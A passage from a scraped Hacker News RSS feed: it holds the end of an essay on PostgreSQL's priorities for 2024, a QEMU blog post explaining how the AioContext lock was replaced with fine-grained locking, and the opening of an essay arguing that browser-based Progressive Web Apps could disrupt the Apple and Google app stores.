helps PostgreSQL to continue to scale vertically, as users can further optimize for heavy write workloads and mitigate the risk of a crash causing an untenable delay in coming back online.</p><p>This is not an exhaustive list of performance-related features. There are many more efforts around PostgreSQL server performance, including indexing optimizations, locking improvements, leveraging hardware acceleration, and more. This in addition to work on clients, such as drivers and connection poolers, that can bring additional performance gains to how apps interact with PostgreSQL. Looking at what the community is working on in 2024, I do believe we’ll continue to see general performance gains across all areas of PostgreSQL.</p><h3 id="developer-features">Developer features</h3><p>I view “developer features” as a fairly broad category around how users can architect and build their apps around PostgreSQL. This includes SQL syntax, functions, <a href="https://wiki.postgresql.org/wiki/PL_Matrix">procedural language support</a>, and other features that help users both build apps and transition from other database systems. One example of such an innovation is the <a href="https://www.postgresql.org/docs/current/rangetypes.html"><code>multirange</code></a> data type, added in PostgreSQL 14, which let users group non-contiguous ranges together. This had many practical purposes, such as in scheduling, and personally let me <a href="https://www.crunchydata.com/blog/better-range-types-in-postgres-14-turning-100-lines-of-sql-into-3">reduce hundreds of lines of PL/pgSQL code into roughly three lines</a>. Developer features is also a way to keep track of how PostgreSQL can support emergent workloads, such as <a href="https://jkatz05.com/post/postgres/vectors-json-postgresql/">JSON or vectors</a>.</p><p>Currently, a lot of innovation on PostgreSQL developer features is occurring in extensions, which is an advantage of PostgreSQL’s extensible model. In the server itself, there are areas where PostgreSQL is lagging behind its previous pace of releasing developer features. For example, PostgreSQL was the <a href="https://jkatz05.com/post/postgres/vectors-json-postgresql/">first relational database to support JSON as a queryable data type</a>, but has been lagging on implementing syntax and features specified in the SQL/JSON standard. PostgreSQL 16 released several of the SQL/JSON syntax features, and there are multiple efforts targeted for 2024 that will include more of the SQL/JSON specification.</p><p>With that said, we should be investing in adding developer features in PostgreSQL that are not possible to add in extensions, such as SQL standard features. I suggest a focus of features that are already available in other databases, such as more of the SQL/JSON standard (e.g. <code>JSON_TABLE</code>), system versioned tables (useful for auditing and “flashback” / bitemporal queries to view data at a specific point in time), and module support (useful for “packaging” stored procedures).</p><p>Additionally, with the previously mentioned focus on availability and performance, we should continue to simplify how users can migrate from other databases to PostgreSQL. As part of my day job, I had the opportunity to read through a lot of content around migration strategies from commercial databases to PostgreSQL, and there’s still ample opportunity to simplify the process while enhancing PostgreSQL capabilities. This includes features available in other databases (e.g. global temporary tables, global partitioned indexes, <a href="https://www.postgresql.org/message-id/f7470d5a-3cf1-4919-8404-5c4d91341a9f@tantorlabs.com">autonomous transactions</a>) and adding more functionality and performance optimizations in PL/pgSQL (bulk data processing functions, <a href="https://commitfest.postgresql.org/46/1608/">schema variables</a>, <a href="https://commitfest.postgresql.org/46/4684/">caching function metadata</a>). All these things improve the PostgreSQL developer experience while making it easier for users coming from other relational databases to adopt PostgreSQL.</p><p>Finally, we need to see how we can continue to support the emergent workload coming from AI/ML data, specifically vector storage and search. At <a href="https://www.pgcon.org/">PGCon</a> 2023, while folks wanted to see native vector support in PostgreSQL itself, there was consensus that implementing functionality in an extension like <a href="https://github.com/pgvector/pgvector">pgvector</a> would let us support these workloads more quickly (and this <a href="https://jkatz05.com/post/postgres/pgvector-overview-0.5.0/">strategy seems to have worked</a> with <a href="https://aws.amazon.com/blogs/database/accelerate-hnsw-indexing-and-searching-with-pgvector-on-amazon-rds-for-postgresql/">great performance results on vector data</a>). However, <a href="https://www.postgresql.eu/events/pgconfeu2023/sessions/session/4592/slides/435/pgconfeu2023_vectors.pdf">given many of the properties of vector workloads</a>, there are additions we can make to PostgreSQL to further support them, including planner optimizations for working with <a href="https://www.postgresql.org/message-id/ad8a178f-bbe7-d89d-b407-2f0fede93144@postgresql.org">TOAST’d data that’s in the active query path</a>, and exploring how we can better support queries where the bulk filtering step occurs in the <code>ORDER BY</code> clause.</p><p>I do think we can make a lot of progress on all of these areas in 2024 and continue to add features directly to PostgreSQL that make it easier to build applications, even as we see a boon of functionality in extensions around PostgreSQL.</p><h3 id="but-what-about-security">But what about security?</h3><p>I do want to quickly disucss security features. PostgreSQL does have a strong reputation for enabling workloads in security-focused environments, but there is always more to do. The past several years, adding native support for <a href="https://wiki.postgresql.org/wiki/Transparent_Data_Encryption">transparent data encryption</a> (TDE) in PostgreSQL has received a lot of attention, but there are other areas we can continue to innovate. This includes adding support for additional authentication methods or mechanisms (OIDC is amongst the biggest asks) and exploring the possibility of a federation authorization model to allow PostgreSQL to inherit permissions from other systems. And while this is challenging today, I’d suggest we look at how we can support TDE on a per-database level. I’m keeping this discussion short as there are ways to satisfy the requirements that these features would add to PostgreSQL today, but we can certainly continue to build towards full native support.</p><p>And with that, let’s look at other areas where PostgreSQL can make progress in 2024.</p><h2 id="extensions">Extensions</h2><p>PostgreSQL was designed to be extensible: you can add functionality to PostgreSQL without having to fork it. This includes new data types, indexing methods, ways to work with other database systems, utilities that make it easier to manage PostgreSQL features, <a href="https://wiki.postgresql.org/wiki/PL_Matrix">additional programming languages</a>, and even <a href="https://github.com/aws/pg_tle">extensions that let you write your own extensions</a>. People have built open source communities and companies around specific PostgreSQL extensions (e.g. <a href="https://postgis.net/">PostGIS</a>), and PostgreSQL extensions have made it possible to support all kinds of workloads (geospatial, timeseries, analytical, AI) from a single database. With <a href="https://gist.github.com/joelonsql/e5aa27f8cc9bd22b8999b7de8aee9d47">thousands of available PostgreSQL extensions</a>, they truly are a “force multiplier” for PostgreSQL and help drive significant adoption while letting users quickly build functionality for their databases!</p><p>The side-effect of all this is we’re now seeing “extension <a href="https://en.wikipedia.org/wiki/Urban_sprawl">sprawl</a>.” How do I know which extension to use? What is the level of support of an extension? How do I know an extension will continue to be actively maintained? How can I help contribute a feature to an extension? Even “where can I download an extension” has become a big question: while postgresql.org has an <a href="https://www.postgresql.org/download/products/6-postgresql-extensions/">incomplete list of extensions</a> and the <a href="https://www.postgresql.org/download/">community packages</a> maintain a set of extensions, there are now multiple PostgreSQL extension repositories available (<a href="https://pgxn.org/">PGXN</a>, <a href="https://database.dev/">dbdev</a>, and <a href="https://pgt.dev/">Trunk</a>).</p><p>One of the strengths of the PostgreSQL community is that it is widely distributed, but we can make it easier to help guide users through the sprawl make informed choices about how they manage their data. I see 2024 as an opportunity to put more central resources into how we represent PostgreSQL extensions, and help users understand when to use certain extensions and their development maturity level, and likewise help extension builders with both governance and maintenance resources.</p><h2 id="community-building">Community Building</h2><p>I wanted to round out thoughts for 2024 around community building. The PostgreSQL contributor community has significantly grown since I first started, and the community has done a better job of <a href="https://www.postgresql.org/community/contributors/">recognizing contributors</a> to all parts of the project, not just the code base (noting that there is still room for improvement here). But we can continue to do better, and there are three areas I’d like to specifically highlight: mentorship and <a href="https://en.wikipedia.org/wiki/Diversity,_equity,_and_inclusion">DEI</a>, and transparency, which will help in all areas of the project.</p><p>During the <a href="https://wiki.postgresql.org/wiki/PgCon_2023_Developer_Meeting#What_are_the_big_challenges_for_our_users.3F_What_are_the_big_challenges_for_us_to_solve.3F">developer meeting @ PGCon 2023</a>, <a href="https://mastodon.social/@melanieplageman/">Melanie Plageman</a> gave a very detailed analysis of the experience of being a newer contributor to PostgreSQL and the challenges it takes to ramp up. Melanie identified many problems: ramp up time on learning basic of how to contribute to PostgreSQL (getting started on the codebase, communicating on the mailing list), the effort to get a patch to a committable state and having a committer interested in it, guidance that may be given with the best of intentions (get started by reviewing patches!) which actually may be more challenging than writing code, and how feedback, when delivered, is delivered.</p><p>On the last point, how to give feedback, I want to call out an <a href="https://rhaas.blogspot.com/2023/12/praise-criticism-and-dialogue.html">excellent blog post by Robert Haas</a> that specifically addresses the power of giving <a href="https://rhaas.blogspot.com/2023/12/praise-criticism-and-dialogue.html">praise while delivering feedback</a> – these things do make a difference and it’s a good reminder in general that we should be supportive even while we’re being critical.</p><p>Back to Melanie’s points, mentorship is something we can do better across the community. Personally, I admit I have been bad at this in areas around project advocacy, including helping to get more people to contribute to the <a href="https://www.postgresql.org/developer/related-projects/">web infrastructure</a> and the <a href="https://www.postgresql.org/about/press/presskit16/">release process</a>. This doesn’t mean PostgreSQL lacks mentorship – I can count numerous folks in the community as mentors – but we can be better in terms of how we can help people get started with contributing and finding mentors who can guide them on their journey.</p><p>2024 serves as a gateway to building better mentorship processes, and we’re looking to test some of these ideas at <a href="https://2024.pgconf.dev/">PGConf.dev 2024</a> in May 2024 in Vancouver.</p><p>(Some history: Before <a href="https://www.pgconf.dev/">PGConf.dev</a>, <a href="https://www.pgcon.org/">PGCon</a> was the event where PostgreSQL contributors gathered to discuss strategic projects for the upcoming development cycle. PGCon was organized by Dan Langille from 2007 to 2023, and after umpteen years of organizing, he was ready to extend the efforts to a group of folks and helped to establish <a href="https://www.pgconf.dev/">PGConf.dev</a>).</p><p><a href="https://www.pgconf.dev/">PGConf.dev</a> is a conference for folks who want to contribute to PostgreSQL, and covers topics around PostgreSQL development (both core server and all open source projects around PostgreSQL such as extensions and drivers), community building, and open source thought leadership. A big portion of PGConf.dev is dedicated to mentorship, and is planning to include workshops around how to contribute to PostgreSQL. If you’re looking for ways to help contribute to PostgreSQL, I strongly suggest attending or <a href="https://2024.pgconf.dev/cfp/">submitting a talk</a>!</p><p>This leads into how the PostgreSQL community can improve in <a href="https://en.wikipedia.org/wiki/Diversity,_equity,_and_inclusion">DEI</a>. I strongly suggest reading the slides and watching the video (when it’s available) of <a href="https://karenjex.blogspot.com/">Karen Jex</a> and <a href="https://mydbanotebook.org/">Lætitia AVROT</a>’s PGConf.eu 2023 talk <a href="https://www.postgresql.eu/events/pgconfeu2023/schedule/session/4913-trying-to-be-barbie-in-kens-mojo-dojo-casa-house/">Trying to be Barbie in Ken’s Mojo Dojo Casa House</a>, as it’s an insightful presentation on how we can continue to make the PostgreSQL community more inclusive. The community has made progress in this area (and Karen and Lætitia point to initiatives that have helped with this), but we can still be better, and we should actively and proactively work to address feedback to help ensure contributing to PostgreSQL is a welcoming experience. There are actions we can all take, for example, calling out an inappropriate (e.g. sexist) behavior as it happens and providing guidance on why it’s not appropriate.</p><p>Finally, there’s transparency. This might seem odd in open source, given, well, it’s open. But there are quite a few governance issues that are discussed not in the open, and it helps to understand how decisions are made. The <a href="https://www.postgresql.org/about/policies/coc_committee/">PostgreSQL Code of Conduct Committee</a> provides an excellent example of how the community can be transparent about issues that require sensitivity. Each year, the Code of Conduct committee publishes a report (<a href="https://www.postgresql.org/about/policies/coc/reports/2022/">here is the one from 2022</a>) of its work, including high level descriptions of cases and overall statistics. This is a practice we can reproduce across many of the PostgreSQL teams that are involved in tasks that may require privacy due to their sensitivity.</p><h2 id="conclusion-this-was-originally-supposed-to-be-a-shorter-post">Conclusion: This was originally supposed to be a shorter post</h2><p>When I originally started writing this, I thought it’d be a pithy post that I’d finish in a few hours. A few days later…</p><p>In all seriousness, PostgreSQL is in a good place. It remains popular, and its reputation for reliability, robustness, and performance remain sound. But we can still do better, and the good news is that the community is actively working towards improving in every which way</p><p>While these are thoughts for what PostgreSQL can do in 2024 and beyond, there’s so much PostgreSQL already does today. In fact, asking questions like “where is PostgreSQL going” does give us an opportunity to step back and reflect on all the progress PostgreSQL has made over the past several years while looking ahead on what is to come!</p></div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[QEMU AioContext removal and how it was done (114 pts)]]></title>
            <link>http://blog.vmsplice.net/2024/01/qemu-aiocontext-removal-and-how-it-was.html</link>
            <guid>38847732</guid>
            <pubDate>Tue, 02 Jan 2024 22:06:34 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="http://blog.vmsplice.net/2024/01/qemu-aiocontext-removal-and-how-it-was.html">http://blog.vmsplice.net/2024/01/qemu-aiocontext-removal-and-how-it-was.html</a>, See on <a href="https://news.ycombinator.com/item?id=38847732">Hacker News</a></p>
<div id="readability-page-1" class="page"><div>
<p>This post is about the AioContext lock removal in QEMU 9.0 (planned for release in 2024), how we got here, and what it means for multi-threaded code in QEMU.</p>

<h2>Early QEMU as a single-threaded program</h2>

<p><a href="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhaRqkkKqhE7ghlhSAp8xKLgRs-R4JL13E2hNg6FnGlbLWGkl4m34B0sLntGiSdNB70eSySkV0tG5O0oV4XIG6KuM9roPIfKHJ6ANI7xiSH-xLI5N2us7AFDmj0dBMlien019UaDJgQ3FLZdO6K2n27U7hyphenhyphenAmvB6KE0M2kmY1NTarvHPDWWNpzpdNvZAEA/s1600/aiocontext-lock-removal.png"><img alt="" data-original-height="323" data-original-width="178" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhaRqkkKqhE7ghlhSAp8xKLgRs-R4JL13E2hNg6FnGlbLWGkl4m34B0sLntGiSdNB70eSySkV0tG5O0oV4XIG6KuM9roPIfKHJ6ANI7xiSH-xLI5N2us7AFDmj0dBMlien019UaDJgQ3FLZdO6K2n27U7hyphenhyphenAmvB6KE0M2kmY1NTarvHPDWWNpzpdNvZAEA/s1600/aiocontext-lock-removal.png"></a></p>

<p>Until 2009 QEMU was largely a single-threaded program. This had the benefit
that the code didn't need to consider thread-safety and was thus simpler and
less bug-prone. The main loop interleaved running the next piece of guest code
and handling external events such as timers, disk I/O, and network I/O. This
architecture had the downside that emulating multi-processor guests was
bottlenecked by the single host CPU on which QEMU ran. There was no parallelism
and this became problematic as multi-processor guests became popular.</p>

<h2>Multi-threading with vCPU threads and the Big QEMU Lock</h2>

<p><a href="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiH839GLUwVrLnNx3fjDgB16sXcc85EsF5DxjWYPUueVjQvtCyVGB3hq_K78iES6Ks3eP97t2NS08WcKIJ9dC0ZwZuptwwNWyvoGB7uA9Lnh24hO5fN7Sky2CKGf2Z3HGXXdMmD8ViypgIKzPnfBbnzg33skQ9HRCp9Osmt9ZCuYNtoR3FV2EkMD42rFS0/s1600/aiocontext-lock-removal%281%29.png"><img alt="" data-original-height="323" data-original-width="400" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiH839GLUwVrLnNx3fjDgB16sXcc85EsF5DxjWYPUueVjQvtCyVGB3hq_K78iES6Ks3eP97t2NS08WcKIJ9dC0ZwZuptwwNWyvoGB7uA9Lnh24hO5fN7Sky2CKGf2Z3HGXXdMmD8ViypgIKzPnfBbnzg33skQ9HRCp9Osmt9ZCuYNtoR3FV2EkMD42rFS0/s1600/aiocontext-lock-removal%281%29.png"></a></p>

<p>The architecture was modified to support running dedicated vCPU threads for KVM guests. This made parallelism possible for multi-processor guests but the feature was initially only available for KVM guests. The Multi-Threaded TCG (MTTCG) feature eventually allowed translated code
  to also take advantage of vCPU threads in 2016.</p>

<p>A straightforward approach to making all existing code thread-safe was taken: the Big QEMU
Lock (BQL) was introduced to serialize access to QEMU's internal state. The BQL is a single global mutex that is used to protect the majority of QEMU's internal state. KVM vCPU threads do not need access to
QEMU's internal state while executing guest code, so they don't hold the BQL most of the time. The main loop thread drops the BQL while blocking in <tt>ppoll(2)</tt> and this allows vCPU threads to acquire the lock when they come out of guest code.</p>

<h2>Multi-threading with IOThreads and the AioContext lock</h2>
<p>Although the vCPU bottleneck had been solved, device emulation still ran with the BQL held. This meant that only a single QEMU thread could process I/O requests at a time. For I/O bound workloads this was a bottleneck and especially disk I/O performance suffered due to this limitation. My first attempt at removing the bottleneck in 2012 amounted to writing a new "dataplane" code path outside the BQL, but it lacked the features that users needed like disk image file formats, I/O throttling, etc because it couldn't use the existing code that relied on the BQL. The long term solution would be introducing thread-safety to the existing code and that led to the creation of the AioContext lock.</p>

<p><a href="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjxXoqTPO2j_GrEHm8cU73KXT1RlIphD4nTi6WX4pRjdSOYwcfzqtvDzQR5bCInPyZzmcrom_46oO1Kq595z2Ie0oK4LuajjWFHoSIkFU5RG0HZFMjv_5ub4E5j7GpdijsikrcsnCdQoBAvs4_h10TjdZs5SEvWbhonBE0B7YpUtsEf6MG1OKlQh5YwVyY/s1600/aiocontext-lock-removal%282%29.png"><img alt="" data-original-height="323" data-original-width="758" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjxXoqTPO2j_GrEHm8cU73KXT1RlIphD4nTi6WX4pRjdSOYwcfzqtvDzQR5bCInPyZzmcrom_46oO1Kq595z2Ie0oK4LuajjWFHoSIkFU5RG0HZFMjv_5ub4E5j7GpdijsikrcsnCdQoBAvs4_h10TjdZs5SEvWbhonBE0B7YpUtsEf6MG1OKlQh5YwVyY/s1600/aiocontext-lock-removal%282%29.png"></a></p>

<p>The AioContext lock was like a mini-BQL but for an event loop (QEMU calls this an AioContext) instead of the entire program. Initially the event loop would acquire the lock while running event handlers, thereby ensuring mutual exclusion for all handlers associated with the event loop. Another thread could acquire the lock to stop the event loop from running and safely access variables. This was a crude approach though and propagated the BQL way of thinking further. QEMU began to suffer from deadlocks and race conditions now that multi-threading was possible. Although I wrote developer documentation about how the model worked, it became tricky to gain confidence in the safety of the code as the whole QEMU block layer needed to grapple with AioContext locking and did so incompletely and inconsistently.</p>

<p>The upshot of all of this was that disk I/O processing could run in a dedicated event loop thread (QEMU calls this an IOThread) while the QEMU monitor could acquire the AioContext lock for a brief moment to inspect the emulated disk for an "info block" monitor command, for example. Unlike the earlier "dataplane" approach, it was now possible for the QEMU block layer to run outside the BQL and instead rely on the AioContext lock.</p>

<h2>Removing the AioContext lock</h2>
<p>Paolo Bonzini had the idea to gradually eliminate the AioContext lock in favor of fine-grained locks because we kept hitting problems with the AioContext lock that I described above. His insight was to change the model so that handler functions would explicitly take their AioContext's lock instead acquiring the lock around the entire event loop iteration. The advantage to letting handlers take the lock was that they could also replace it with another mechanism. Eventually it would be possible to move away from the AioContext lock.</p>

<p>What came after was a multi-year journey that I credit to Paolo's vision. Emanuele Giuseppe Esposito worked with Paolo on putting fine-grained locking into practice and on sorting through the entire QEMU block layer to determine under which threads and locks variables were accessed. This was a massive effort and required a lot of persistence. Kevin Wolf figured out how to use clang's Thread Safety Analysis (TSA) to check some of the locking rules at compile time. Kevin also spent a lot of time protecting the block driver graph with a reader/writer lock so that in-flight I/O does not crash amidst modifications to the graph. Emanuele and Kevin gave a talk at KVM Forum 2023 about the larger QEMU multi-queue block layer effort and the slides are available <a href="https://kvm-forum.qemu.org/2023/Multiqueue_in_the_block_layer_wLom4Bt.pdf">here (PDF)</a>.</p>

<p><a href="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhoui6qLoeUNBnyz6Wz8LN9aZz-0kMBT0wU4dkZFnMWnaR61H9esMca1QZ0RJh1w-FkVrPGOMLrV622ZG4Wh2ucn3xFD6AIFxUIlV2D_mjyBIESdj4eMoEbISGdVTzOhoW10Dn01eCzP7pdjmR5EJRcD9_I3-rGmRbW4zbMJsgEJVJiHGfLHPogXr_Lkpw/s1600/aiocontext-lock-removal%283%29.png"><img alt="" data-original-height="323" data-original-width="585" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhoui6qLoeUNBnyz6Wz8LN9aZz-0kMBT0wU4dkZFnMWnaR61H9esMca1QZ0RJh1w-FkVrPGOMLrV622ZG4Wh2ucn3xFD6AIFxUIlV2D_mjyBIESdj4eMoEbISGdVTzOhoW10Dn01eCzP7pdjmR5EJRcD9_I3-rGmRbW4zbMJsgEJVJiHGfLHPogXr_Lkpw/s1600/aiocontext-lock-removal%283%29.png"></a></p>

<p>Once everything that previously relied on the AioContext lock had switched to another form of thread-safety, it was possible to remove the AioContext lock as nothing used it anymore. The BQL is still widely used and covers global state that is accessed from few threads. Code that can run in any IOThread now uses its own locks or other mechanisms. The complexity of the codebase is still roughly the same as with the AioContext lock, but now there are fine-grained locks, which are easier to understand and there are fewer undocumented locking assumptions that led to deadlocks and races in the past.</p>

<h2>Conclusion</h2>
<p>QEMU's AioContext lock enabled multi-threading but was also associated with deadlocks and race conditions due to its ambient nature. From QEMU 9.0 onwards, QEMU will switch to fine-grained locks that are more localized and make thread-safety more explicit. Changing locking in a large program is time-consuming and difficult. It took a multi-person multi-year effort to complete this work, but it forms the basis for further work including the QEMU multi-queue block layer effort that push multi-threading further in QEMU.</p>

</div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Browsers are the most likely disruptor of the mobile duopoly (280 pts)]]></title>
            <link>https://infrequently.org/2024/01/the-web-is-the-app-store/</link>
            <guid>38847719</guid>
            <pubDate>Tue, 02 Jan 2024 22:05:06 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://infrequently.org/2024/01/the-web-is-the-app-store/">https://infrequently.org/2024/01/the-web-is-the-app-store/</a>, See on <a href="https://news.ycombinator.com/item?id=38847719">Hacker News</a></p>
<div id="readability-page-1" class="page"><div id="content">
      <!-- BLOCK_CONTENT -->

  
  <article>
    <header>
      <h2>
        <a href="https://infrequently.org/2024/01/the-web-is-the-app-store/">Why Are Tech Reporters Sleeping On The Biggest App Store Story?</a>
      </h2>
      <h3>Browsers are the most likely disruptor of the mobile duopoly but you'd never know it reading Wired or The Verge.</h3>
      
    </header>
    <p>The tech news is chockablock<sup><a href="#fn-recent-antitrust-news-1" id="fnref-recent-antitrust-news-1">[1]</a></sup> with <a href="https://open-web-advocacy.org/blog/owa-2023-review/">antitrust rumblings and slow-motion happenings.</a> Through eagle-eyed press coverage, regulatory reports, and legal discovery the shady dealings of <a href="https://www.theverge.com/2020/4/3/21206400/apple-tax-amazon-tv-prime-30-percent-developers">Apple</a> and <a href="https://www.theverge.com/2023/11/30/23923533/google-explains-why-some-developers-were-able-to-get-away-with-paying-less-on-play">Google's</a> app stores are now comprehensively documented and pressure for change has built to an unsustainable level. Something's gotta give.</p>
<p>This is the backdrop to the biggest app store story nobody is writing about: on pain of <a href="https://ec.europa.eu/commission/presscorner/detail/en/qanda_20_2349#:~:text=In%20case%20a,systemic%20non%2Dcompliance.">steep fines,</a> gatekeepers are opening up to competing browsers. This, in turn, will enable competitors to replace app stores with directories of <a href="https://infrequently.org/2015/06/progressive-apps-escaping-tabs-without-losing-our-soul/">Progressive Web Apps</a>. Capable browsers that <a href="https://patrickbrosset.com/articles/2023-09-26-my-first-tpac-conference/#:~:text=The%20Web%20Applications,was%20also%20reviewed.">expose</a> web app installation and powerful features to developers can kickstart app portability, breaking open the mobile duopoly.</p>
<p>But you'd never know it reading Wired or The Verge.</p>
<div><ul><li><a href="#the-buried-lede">The Buried Lede </a></li><li><a href="#disruption-disrupted">Disruption Disrupted </a></li><li><a href="#green-shoots">Green Shoots </a></li><li><a href="#a-new-hope">A New Hope </a></li></ul></div>
<p>With shockingly few <a href="https://www.theregister.com/2023/10/09/apple_app_store/">exceptions,</a> coverage of app store regulation that the answer to crummy, extractive native app stores is other native app stores. This unexamined framing shapes hundreds of pieces covering regulatory events, including <a href="https://www.rollingstone.com/culture/culture-commentary/internet-future-about-to-get-weird-1234938403/">by web-friendly authors.</a> The tech press almost universally fails to mention the web as a <a href="https://en.wikipedia.org/wiki/Substitute_good">substitute</a> for native apps and fail to inform readers of its potential to disrupt app stores.</p>
<p>As <a href="https://doctorow.medium.com/the-open-web-is-good-actually-9683c692df84#:~:text=%E2%80%9CAn%20app%20is%20just%20a%20web%2Dpage%20wrapped%20in%20enough%20IP%20to%20make%20it%20a%20crime%20to%20defend%20yourself%20against%20corporate%20predation%E2%80%9D">Cory Doctorow observed</a>:</p>
<blockquote>
<p>"An app is just a web-page wrapped in enough IP to make it a crime to defend yourself against corporate predation."</p>
</blockquote>
<p>The implication is clear: browsers unchained can do to mobile what the web did to desktop, where more than 70% of daily "jobs to be done" happen on the web.</p>
<p>Replacing mobile app stores will look different than the web's path to desktop centrality, but the enablers are waiting in the wings. It has gone largely unreported that <a href="https://web.dev/explore/progressive-web-apps">Progressive Web Apps (PWAs)</a> have been held back by Apple and Google denying competing browsers access to essential APIs.<sup><a href="#fn-convergent-agendas-2" id="fnref-convergent-agendas-2">[2]</a></sup></p>
<p>Thankfully, regulators haven't been waiting on the press to explain the situation. Recent interventions into mobile ecosystems include requirements to repair browser choice, and the analysis backing those regulations takes into account the web's role as a potential competitor (e.g., <a href="https://www.jftc.go.jp/file/230327EN_Summary.pdf">Japan's JFTC (pdf)</a>).</p>
<p>Regulators seem to understand that:</p>
<ul>
<li>App stores protect proprietary ecosystems through preferential discovery and capabilities.</li>
<li>Stores then extract rents from developers dependent on commodity capabilities duopolists provide only through proprietary APIs.</li>
<li>App portability threatens the proprietary agenda of app stores.</li>
<li>The web can interrupt this model by bringing portability to apps and over-the-top discovery through search. This has yet to happen because...</li>
<li>The duopolists, in different ways, have kneecapped competing browsers along with their own, keeping the web from contesting the role of app stores.</li>
</ul>
<p>Apple and Google saw what the web did to desktop, and they've laid roadblocks to the competitive forces that would let history repeat on smartphones.</p>
<h2 id="the-buried-lede">The Buried Lede <a href="#the-buried-lede">#</a></h2>
<p>The web's potential to disrupt mobile is evident to regulators, <a href="https://open-web-advocacy.org/">advocates</a>, and developers. So why does the tech news fail to explain the situation?</p>
<p>Consider <a href="https://www.techmeme.com/231226/p14#a231226p14">just one</a> of the many antitrust events of recent months. It was covered by <a href="https://www.theverge.com/2023/12/28/24017565/japan-plans-to-crack-down-on-apple-and-google-app-stores">The Verge</a>, <a href="https://www.macrumors.com/2023/12/27/japan-preparing-eu-style-law/">Mac Rumors</a>, <a href="https://appleinsider.com/articles/23/12/26/japan-plans-to-fine-apple-over-app-stores-and-antitrust-issues">Apple Insider</a>, and <a href="https://news.ycombinator.com/item?id=38773429">more.</a></p>
<p>None of the linked articles note browser competition's potential to upend app stores. Browsers unshackled have the potential to free businesses from build-it-twice proprietary ecosystems, end rapacious app store taxes, pave the way for new OS entrants — all without the valid security concerns side-loading introduces.</p>
<p>Lest you think this an isolated incident, <a href="https://www.techmeme.com/230820/p8#a230820p8">this article on the impact of the EU's DMA</a> lacks any hint of the web's potential to unseat app stores. You can repeat this trick with <a href="https://www.techmeme.com/search/query?q=EU+DMA&amp;wm=false"><em>any</em> DMA story from the past year</a>. Or spot-check <a href="https://www.techmeme.com/230201/p11#a230201p11">coverage</a> of the <a href="https://www.ntia.gov/report/2023/competition-mobile-app-ecosystem">NTIA's February report.</a></p>
<p>Reporters are "covering" these stories in the lightest sense of the word. Barrels of virtual ink has been spilt documenting unfair app store terms, conditions, and competition. And yet.</p>
<h2 id="disruption-disrupted">Disruption Disrupted <a href="#disruption-disrupted">#</a></h2>
<p>In an industry obsessed with "disruption," why is this David vs. Goliath story going untold? Some theories, in no particular order.</p>
<p>First, Mozilla <a href="https://infrequently.org/2020/06/platform-adjacency-theory/#the-committee-to-cast-the-web-in-amber">isn't advocating for a web that can challenge native apps,</a> and none of the other major browser vendors are telling the story either. Apple and Google have no interest in seeing their lucrative proprietary platforms supplanted, and Microsoft (your narrator's employer) <a href="https://www.theverge.com/2023/10/24/23930478/microsoft-ceo-satya-nadella-mobile-windows-phone">famously lacks sustained mobile focus.</a></p>
<p>Next, it's hard to overlook that tech reporters live like wealthy people, iPhones and all. From that vantage point, it's often news that the web is <a href="https://fugu-tracker.web.app/">significantly more capable</a> on other OSes (never mind that they spend much of every day working in a desktop browser). It's hard to report on the potential of something you can't see for yourself.</p>
<p>Also, this might all be Greek. Reporters and editors aren't software engineers, so the potential of browser competition can remain understandably opaque. Stories that include mention of "alternative app stores" generally fail to mention that these stores may not be as safe, or that OS restrictions on features won't disappear just because of a different distribution mechanism, or that the security track records of the <em>existing</em> duopolist app stores are sketchy at best. Under these conditions, it's asking a lot to expect details-based discussion of alternatives, given the many technical wrinkles. Hopefully, <a href="https://open-web-advocacy.org/">someone can walk them through it.</a></p>
<p>Further, <a href="https://en.wikipedia.org/wiki/Contestable_market">market contestability theory</a> has only recently become a big part of the tech news beat. Regulators have been writing reports to convey their understanding of the market, and to shape effective legislation that will unchain the web, but smart folks unversed in both antitrust and browser minutiae might need help to pick up what regulators are putting down.</p>
<p>Lastly, it hasn't happened yet. Yes, <a href="https://infrequently.org/2015/06/progressive-apps-escaping-tabs-without-losing-our-soul/">Progressive Web Apps</a> have been around for a few years, but they haven't had an impact on the iPhones that reporters and their circles almost universally carry. It's much easier to get folks to cover stories that directly affect them, and this is one that, so far, largely hasn't.</p>
<h2 id="green-shoots">Green Shoots <a href="#green-shoots">#</a></h2>
<p>The seeds of web-based app store dislocation have already been sown, but the chicken-and-egg question at the heart of platform competition looms.</p>
<p>On the technology side, Apple has been <a href="https://infrequently.org/2021/04/progress-delayed/">enormously successful at denying essential capabilities to the web</a> through a strategy of compelled monoculture combined with strategic foot-dragging.</p>
<figure>
<a href="https://mastodon.social/@bobpony/111602947135060878" alt="undefined">
<picture width="682" height="841">
  <source sizes="(max-width: 1200px) 70vw, 600px" srcset="https://infrequently.org/2024/01/the-web-is-the-app-store/every_browser_toot.webp?nf_resize=fit&amp;w=3600 2400w,
                  https://infrequently.org/2024/01/the-web-is-the-app-store/every_browser_toot.webp?nf_resize=fit&amp;w=2400 1600w,
                  https://infrequently.org/2024/01/the-web-is-the-app-store/every_browser_toot.webp?nf_resize=fit&amp;w=1800 1200w,
                  https://infrequently.org/2024/01/the-web-is-the-app-store/every_browser_toot.webp?nf_resize=fit&amp;w=1200   800w,
                  https://infrequently.org/2024/01/the-web-is-the-app-store/every_browser_toot.webp?nf_resize=fit&amp;w=900   600w,
                  https://infrequently.org/2024/01/the-web-is-the-app-store/every_browser_toot.webp?nf_resize=fit&amp;w=750   500w,
                  https://infrequently.org/2024/01/the-web-is-the-app-store/every_browser_toot.webp?nf_resize=fit&amp;w=600   400w">
<img src="https://infrequently.org/2024/01/the-web-is-the-app-store/every_browser_toot.webp" alt="Missing alt text" width="682" height="841" decoding="async">
</picture>

</a>
  <figcaption></figcaption>
</figure>
